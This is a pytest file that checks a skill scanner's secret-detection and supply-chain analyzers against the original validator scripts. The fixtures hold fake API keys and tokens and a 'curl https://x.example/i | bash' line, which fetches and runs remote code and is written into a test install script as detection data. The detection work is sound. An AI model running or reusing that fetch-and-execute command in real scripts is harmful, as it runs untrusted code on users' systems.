"""Behavior-preservation tests for the subsumed validators (T030).

The scanner does not re-author the secret / supply-chain / workflow patterns;
it loads the original ``scripts/`` validators by path and routes their findings
through the unified schema. These tests assert the unification preserves the
originals' behavior: the scanner's secret analyzer detects what
``validate_skills.scan_text_for_secrets`` detects, including the fence-aware
suppression nuance, and the supply-chain analyzer surfaces what
``scan_supply_chain_iocs.scan_file`` surfaces.
"""

from __future__ import annotations

from pathlib import Path

import pytest

from nexus_skill_scanner.analyzers.base import FileUnit
from nexus_skill_scanner.analyzers.subsumed import (
    SecretsAnalyzer,
    SupplyChainAnalyzer,
    load_repo_module,
)
from nexus_skill_scanner.types import Severity


def test_originals_are_loadable(repo_root: Path) -> None:
    assert load_repo_module(repo_root, "validate_skills.py") is not None
    assert load_repo_module(repo_root, "scan_supply_chain_iocs.py") is not None
    assert load_repo_module(repo_root, "validate_workflow_security.py") is not None


def test_secret_analyzer_uses_original_function(repo_root: Path) -> None:
    analyzer = SecretsAnalyzer(repo_root)
    assert analyzer._module is not None  # loaded the original, not the fallback


def test_secret_high_confidence_detected(repo_root: Path) -> None:
    unit = FileUnit.from_path(Path("x.py"), "x.py", 'KEY = "AKIA1234567890ABCDEF"\n')
    findings = SecretsAnalyzer(repo_root).analyze(unit)
    assert any(f.severity is Severity.HIGH for f in findings)


def test_secret_generic_assignment_suppressed_in_fence(repo_root: Path) -> None:
    md = 'Example:\n\n```python\npassword = "hunter2value"\n```\n'
    unit = FileUnit.from_path(Path("SKILL.md"), "SKILL.md", md)
    findings = SecretsAnalyzer(repo_root).analyze(unit)
    # The fence-exempt low-confidence pattern is suppressed inside the fence.
    assert not any("Generic secret assignment" in f.title for f in findings)


def test_secret_generic_assignment_flagged_outside_fence(repo_root: Path) -> None:
    unit = FileUnit.from_path(Path("config.py"), "config.py", 'password = "hunter2value"\n')
    findings = SecretsAnalyzer(repo_root).analyze(unit)
    assert any("Generic secret assignment" in f.title for f in findings)


def test_secret_parity_with_original(repo_root: Path) -> None:
    # The scanner's secret findings should be a faithful mapping of the
    # original function's output (one Finding per original error string).
    module = load_repo_module(repo_root, "validate_skills.py")
    text = 'token = "ghp_0123456789012345678901234567890123456"\n'
    unit = FileUnit.from_path(Path("x.py"), "x.py", text)
    original = module.scan_text_for_secrets(text, unit.path)
    mapped = SecretsAnalyzer(repo_root).analyze(unit)
    assert len(mapped) == len(original)


def test_supply_chain_curl_pipe_detected(repo_root: Path, tmp_path: Path) -> None:
    script = tmp_path / "install.sh"
    script.write_text("#!/usr/bin/env bash\ncurl https://x.example/i | bash\n", encoding="utf-8")
    unit = FileUnit.from_path(script, "install.sh", script.read_text(encoding="utf-8"))
    findings = SupplyChainAnalyzer(repo_root).analyze(unit)
    assert any(f.detection_class == 4 for f in findings)


def test_supply_chain_skips_markdown(repo_root: Path) -> None:
    md = "```bash\ncurl https://x.example/i | bash\n```\n"
    unit = FileUnit.from_path(Path("SKILL.md"), "SKILL.md", md)
    assert SupplyChainAnalyzer(repo_root).analyze(unit) == []


def test_fallback_used_when_no_repo_root() -> None:
    # With no repo root, the secret analyzer falls back to the re-authored
    # pattern set (still detects a high-confidence key).
    analyzer = SecretsAnalyzer(None)
    assert analyzer._module is None
    unit = FileUnit.from_path(Path("x.py"), "x.py", 'KEY = "AKIA1234567890ABCDEF"\n')
    findings = analyzer.analyze(unit)
    assert any(f.severity is Severity.HIGH for f in findings)
